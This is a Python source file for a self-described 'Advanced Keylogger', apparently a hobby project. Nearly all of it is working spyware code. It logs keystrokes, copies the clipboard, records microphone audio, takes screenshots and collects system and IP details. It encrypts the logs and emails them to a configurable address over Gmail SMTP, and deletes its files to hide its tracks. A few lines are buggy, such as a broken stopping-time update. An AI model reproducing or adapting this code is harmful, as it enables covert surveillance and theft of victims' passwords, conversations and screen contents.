'''add all the necessary modules like pynput by going to settings>interpreter peferences and add them'''
#Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard         #Get Clipboard information

from pynput.keyboard import Key, Listener       #Capturing the key logs from keyboard, Key logs the key and Listener listens
                                                    #for each key logged on the keyboard'''

import time
import os

from scipy.io.wavfile import write       #Get sound from microphone'''
import sounddevice as sd

from cryptography.fernet import Fernet       #Encrypt the files'''

import getpass
from requests import get

from multiprocessing import Process, freeze_support    #Capture the screenshots and freeze them so that only 1 can be taken at a time'''
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "systeminfo.txt"  #Required for getting system information
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"                #Names of the Encrypted Files
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"


microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3        #we will have 3 repitions of 15 seconds each of the features

email_address = " "                  #Required for email functionality
password = " "

toaddr= " "

key = "KJUfjSlszMG1OOnbHH2JmcFvndrURpJqv0GG_ibjJIQ="


file_path = "D:\\Project\\Advanced Keylogger\\Project"       #Required for keylogging functionality
extend="\\"
file_merge = file_path + extend

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart ()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log file"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))    #Attach the body of the message to email

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application','octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition',"attachment; filename = %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)       #port number and server used for gmail

    s.starttls()                              #starts the session

    s.login(fromaddr, password)                 #login into server

    text = msg.as_string()                  #we have to send the multipart as string

    s.sendmail(fromaddr, toaddr, text)        #bind everything together and send email

    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr)   #send system information as attachement

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)       #get private IP address
        try:
            public_ip = get("https://api.ipify.org").text    #get public ip from the site
            f.write("Public IP Address: " +public_ip)
        except Exception:
            f.write("Couldn't get public IP address (most likely max query)")

        f.write("\nProcessor: " + (platform.processor()) + '\n')                 #Get processor information
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

#send_email(system_information, file_path + extend + system_information, toaddr)   #send system information as attachement


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")              #Except block enters when the clipboard contents are in non string format.

copy_clipboard()

def microphone():
    fs = 44100          #Sampling frequency
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration        #every single time we want to go for the features, we have current time and adds the iteration time

while number_of_iterations < number_of_iterations_end:


    count = 0
    keys = []

    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count+=1
        currentTime = time.time()

        if(count>=1):
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")    #turn 'h''e' to he '''
                if k.find("space")>0:   #When more than 1 space s found, convert it to newline'''
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key==Key.esc:            #Exit upon pressing ESC'''
            return False
        if(currentTime > stoppingTime):     #if the current time has passed end time, keylogging will stop
            return False
    with Listener(on_press=on_press, on_release=on_release) as listener: #Binds the 3 functions together using Listener'''
        listener.join()

    if currentTime > stoppingTime:        #clear out the log files

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations+=1

        currentTime = time.time()
        stoppingTime = time.time().time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb' ) as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count +=1

time.sleep(120)

#clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
